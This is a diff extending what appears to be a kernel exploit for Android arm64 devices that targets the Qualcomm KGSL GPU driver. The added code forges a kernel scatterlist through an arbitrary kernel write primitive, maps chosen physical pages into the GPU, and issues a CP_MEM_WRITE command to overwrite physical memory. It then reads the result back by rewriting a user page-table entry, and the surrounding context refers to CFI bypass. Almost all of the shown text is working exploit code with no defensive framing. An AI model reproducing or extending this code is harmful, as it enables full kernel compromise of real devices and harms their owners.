@@ -24,6 +24,17 @@ struct kgsl_map_user_mem {
 struct ion_allocation_data { uint64_t len; uint32_t heap_id_mask, flags, fd, unused; };
 #define ION_IOC_ALLOC_ _IOWR('I', 0, struct ion_allocation_data)
 
+/* KGSL submission ABI for the GPU-write test (KGW=1). */
+struct kgsl_drawctxt_create { uint32_t flags; uint32_t drawctxt_id; };
+struct kgsl_ibdesc { unsigned long gpuaddr; unsigned long __pad; size_t sizedwords; unsigned int ctrl; };
+struct kgsl_ringbuffer_issueibcmds {
+  unsigned int drawctxt_id; unsigned long ibdesc_addr;
+  unsigned int numibs; unsigned int timestamp; unsigned int flags;
+};
+#define IOCTL_KGSL_DRAWCTXT_CREATE_ _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
+#define IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_ _IOWR(0x09, 0x10, struct kgsl_ringbuffer_issueibcmds)
+#define CP_MEM_WRITE 0x3du
+
 /* --- dirty-PTE helper: map an arbitrary physical page into userspace --------
  * arm64 (VA_BITS=39, 4K granule) = 3 levels: pgd[38:30] pmd[29:21] pte[20:12].
  * Returns the PTE slot address and value for a user VA. */
@@ -1285,6 +1296,7 @@ int try_cfi_stage(void) {
                         (size_t)file, (size_t)priv);
                 uint64_t qorig[64] = {0};
                 uintptr_t A_saved = 0;
+                uintptr_t gSL = 0;   /* forged scatterlist slot (for the KGW fire) */
                 if (is_direct_ptr(priv)) {
                   uintptr_t A = (uintptr_t)priv;
                   A_saved = A;
@@ -1305,6 +1317,7 @@ int try_cfi_stage(void) {
                      * attachments self-linked at 0x88/0x90. */
                     uint64_t vs = (uint64_t)VMEMMAP_START;   /* arm64: fixed vmemmap base */
                     uintptr_t FB = A + 0x100, GT = A + 0x1A0, SL = A + 0x1B0;
+                    gSL = SL;
                     for (int k = 0; k < 20; k++) configfs_write_once(fd, FB + k * 8, &z, 8);
                     configfs_write_once(fd, FB + 0x70, &GT, 8);       /* sg_table? */
                     configfs_write_once(fd, FB + 0x78, &GT, 8);       /* sg_table? */
@@ -1403,8 +1416,91 @@ int try_cfi_stage(void) {
                   pr_info("kgsl_drm: firing KGSL ioctl gfd=%d hostptr=%p ...\n", gfd, p);
                   fsync(1);
                   int rr = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m);
-                  pr_info("kgsl_drm: ioctl ret=%d errno=%d\n", rr, errno);
+                  pr_info("kgsl_drm: ioctl ret=%d gpuaddr=%016zx errno=%d\n",
+                          rr, (size_t)m.gpuaddr, errno);
                   fsync(1);
+                  /* KGW=1: submit a CP_MEM_WRITE through the GPU to the target page
+                   * that was just mapped (m.gpuaddr).  Needs a second mapping for
+                   * the IB: point the forged scatterlist at one of our own anon
+                   * pages, whose phys we find with the dirty-PTE walk. */
+                  const char *kgw = getenv("KGW");
+                  if (rr == 0 && kgw && *kgw && gSL) {
+                    uint64_t msv = 0, mmv = 0, pgdv = 0;
+                    configfs_read_once(fd, data_addr(MEMSTART_ADDR), &msv, 8);
+                    if (!msv) msv = 0x80000000ULL;
+                    configfs_read_once(fd, task + 0x5f8, &mmv, 8);
+                    if (is_direct_ptr(mmv)) configfs_read_once(fd, mmv + 0x48, &pgdv, 8);
+                    uint32_t *ib = (uint32_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                    if (ib != MAP_FAILED) ib[0] = 0;   /* fault the page in */
+                    uintptr_t sslot = 0; uint64_t ibpte = 0;
+                    int ok = (ib != MAP_FAILED) && is_direct_ptr(pgdv) &&
+                             gl_pte_walk2(fd, pgdv, (uintptr_t)ib, 3, msv, &sslot, &ibpte);
+                    if (!ok) {
+                      pr_info("kgw: cannot locate IB page phys (mm=%016zx pgd=%016zx stage=%d)\n",
+                              (size_t)mmv, (size_t)pgdv, gl_pt_stage); fsync(1);
+                    } else {
+                      uint64_t ib_phys = (uint64_t)(ibpte & PTE_OA_MASK) & ~0xfffULL;
+                      const char *vv = getenv("KGW_VAL");
+                      uint32_t val = (uint32_t)strtoul(vv && *vv ? vv : "0x41", NULL, 0);
+                      ib[0] = (7u << 28) | (CP_MEM_WRITE << 16) | 3u;
+                      ib[1] = (uint32_t)m.gpuaddr;
+                      ib[2] = (uint32_t)(m.gpuaddr >> 32);
+                      ib[3] = val;
+                      pr_info("kgw: ib_phys=%016zx gpu_tgt=%016zx pm4=%08x %08x %08x %08x\n",
+                              (size_t)ib_phys, (size_t)m.gpuaddr, ib[0], ib[1], ib[2], ib[3]);
+                      fsync(1);
+                      /* second fire: forged scatterlist -> our IB page */
+                      uint64_t ibpage = (uint64_t)VMEMMAP_START +
+                                        ((ib_phys - msv) >> 12) * 0x40;
+                      uint64_t ibpl = ibpage | 2;
+                      configfs_write_once(fd, gSL + 0x00, &ibpl, 8);
+                      struct kgsl_map_user_mem m2; memset(&m2, 0, sizeof m2);
+                      m2.fd = dfd; m2.len = cd.size;
+                      m2.hostptr = (unsigned long)p; m2.memtype = 2;
+                      int r2 = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m2);
+                      pr_info("kgw: ib map ret=%d gpuaddr=%016zx errno=%d\n",
+                              r2, (size_t)m2.gpuaddr, errno); fsync(1);
+                      if (r2 == 0 && m2.gpuaddr) {
+                        struct kgsl_drawctxt_create dc; memset(&dc, 0, sizeof dc);
+                        dc.flags = 0x12;  /* KGSL_CONTEXT_PREAMBLE|NO_GMEM_ALLOC */
+                        int rd = ioctl(gfd, IOCTL_KGSL_DRAWCTXT_CREATE_, &dc);
+                        pr_info("kgw: drawctxt ret=%d ctx=%08x errno=%d\n",
+                                rd, dc.drawctxt_id, errno); fsync(1);
+                        if (rd == 0) {
+                          /* ultra-legacy path: ibdesc_addr = IB gpuaddr,
+                           * numibs = size in DWORDs */
+                          struct kgsl_ringbuffer_issueibcmds ic; memset(&ic, 0, sizeof ic);
+                          ic.drawctxt_id = dc.drawctxt_id;
+                          ic.ibdesc_addr = (unsigned long)m2.gpuaddr;
+                          ic.numibs = 4;         /* 4 dwords = 16 bytes */
+                          ic.flags = 0;
+                          int ri = ioctl(gfd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_, &ic);
+                          pr_info("kgw: submit ret=%d ts=%u errno=%d\n",
+                                  ri, ic.timestamp, errno); fsync(1);
+                          /* read the target page back in-process via a dirty PTE */
+                          const char *sp2 = getenv("KGSL_SGT_PHYS");
+                          uint64_t tphys = sp2 ? strtoull(sp2, NULL, 0) : 0;
+                          uint32_t *rb = (uint32_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                          if (rb != MAP_FAILED && tphys) {
+                            rb[0] = 0;
+                            uintptr_t rs = 0; uint64_t rpte = 0;
+                            if (gl_pte_walk2(fd, pgdv, (uintptr_t)rb, 3, msv, &rs, &rpte)) {
+                              uint64_t npte = (ibpte & ~PTE_OA_MASK) |
+                                              ((tphys & ~0xfffULL) & PTE_OA_MASK);
+                              mprotect(rb, 0x1000, PROT_NONE);
+                              configfs_write_once(fd, rs, &npte, 8);
+                              pr_info("kgw: READBACK tgt[0..3] = %08x %08x %08x %08x\n",
+                                      rb[0], rb[1], rb[2], rb[3]);
+                              fsync(1);
+                              configfs_write_once(fd, rs, &rpte, 8);  /* restore */
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
                   /* Run KGSL's mem-entry teardown NOW, while the forged ops is
                    * still in place (kgsl_release -> kgsl_mem_entry_destroy ->
                    * kgsl_destroy_ion -> dma_buf_unmap_attachment).  Otherwise the
